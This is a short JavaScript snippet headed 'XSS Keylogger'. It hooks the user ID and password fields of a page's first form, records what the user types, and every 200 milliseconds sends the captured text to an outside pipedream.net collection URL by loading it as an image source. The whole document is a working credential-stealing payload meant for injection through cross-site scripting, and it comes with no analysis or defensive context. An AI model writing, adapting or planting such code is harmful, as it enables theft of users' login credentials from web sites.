// XSS Keylogger
function xss() {
    let keys = "";
    let hackUrl = "https://eobws14x5y95evd.m.pipedream.net?keys=";

    let user_id = document.forms[0].elements.user_id.addEventListener("input", function (event) {
        keys += event.target.value;
        keys += "|";
    });

    let user_pw = document.forms[0].elements.user_pw.addEventListener("input", function (event) {
        keys += event.target.value;
        keys += "|";
    });

    setInterval(() => {
        if (keys !== "") {
            new Image().src = `${hackUrl}${encodeURIComponent(keys)}`;
            keys = "";
        }
    }, 200);
}
